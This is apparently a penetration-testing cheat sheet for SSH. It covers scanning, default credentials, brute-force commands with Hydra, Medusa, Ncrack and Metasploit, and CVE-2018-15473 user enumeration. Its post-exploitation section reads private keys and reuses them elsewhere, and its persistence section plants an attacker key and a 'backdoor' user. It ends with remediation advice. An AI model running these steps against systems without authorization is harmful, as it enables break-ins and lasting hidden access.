# SSH Penetration Testing Methodology

## Overview
SSH (Secure Shell) is a protocol for secure remote access. Default port is 22, but commonly found on 2222, 22222 as well.

## Initial Reconnaissance

### 1. Version Detection
```bash
nmap -sV -sC -p22 {target}
```
Key information to note:
- SSH version (OpenSSH, Dropbear, etc.)
- Protocol version (SSH-2.0 preferred, SSH-1.0 is vulnerable)
- Operating system hints from banner

### 2. Algorithm Audit
```bash
ssh-audit {target}
```
Check for:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc, blowfish-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Weak host key types (ssh-dss)

## Credential Attacks

### 1. Default Credentials
Common default combinations to try:
- root:root
- root:toor
- admin:admin
- admin:password
- user:user
- ubuntu:ubuntu
- pi:raspberry

### 2. Brute Force
```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://{target} -t 4

# Medusa (parallel)
medusa -h {target} -U users.txt -P passwords.txt -M ssh -t 4

# Ncrack
ncrack -p22 --user root -P passwords.txt {target}
```

### 3. Known Credentials
If you've found credentials elsewhere:
- Check password reuse
- Try variations of found passwords
- Try username as password

## User Enumeration

### CVE-2018-15473 (OpenSSH < 7.7)
```bash
# Using auxiliary module
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set USER_FILE users.txt; run"

# Using Python script
python3 ssh-enum.py {target} -w users.txt
```

## Exploitation

### Common Vulnerabilities

1. **CVE-2018-15473** - OpenSSH User Enumeration (< 7.7)
   - Allows username enumeration via timing attack
   - Metasploit: `auxiliary/scanner/ssh/ssh_enumusers`

2. **CVE-2016-0777/0778** - OpenSSH Roaming Bug
   - Affects OpenSSH 5.4 - 7.1p1
   - Client-side vulnerability, memory disclosure

3. **CVE-2008-0166** - Debian OpenSSL Weak Keys
   - Debian/Ubuntu systems from 2006-2008
   - Predictable key generation

### Metasploit Modules
```bash
# Version detection
use auxiliary/scanner/ssh/ssh_version

# Login brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS {target}
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# User enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS {target}
set USER_FILE users.txt
run

# Public key login
use auxiliary/scanner/ssh/ssh_login_pubkey
```

## Post-Exploitation

### If Access Gained

1. **Enumerate sudo rights**
   ```bash
   sudo -l
   ```

2. **Check SSH keys**
   ```bash
   cat ~/.ssh/authorized_keys
   cat ~/.ssh/id_rsa
   cat ~/.ssh/known_hosts
   ```

3. **Examine SSH config**
   ```bash
   cat /etc/ssh/sshd_config
   ```
   Look for:
   - PermitRootLogin
   - PasswordAuthentication
   - AuthorizedKeysFile

4. **Check for key reuse**
   - Copy discovered private keys
   - Try keys on other hosts

## Persistence

### Add SSH Key
```bash
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
```

### Backdoor SSH (requires root)
```bash
# Add backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
```

## Remediation Recommendations

1. Disable password authentication, use keys only
2. Disable root login (PermitRootLogin no)
3. Use strong key exchange algorithms only
4. Implement fail2ban for brute force protection
5. Use non-standard port (security through obscurity, limited value)
6. Enable 2FA (Google Authenticator, Duo)
7. Restrict SSH access by IP (firewall or sshd_config)
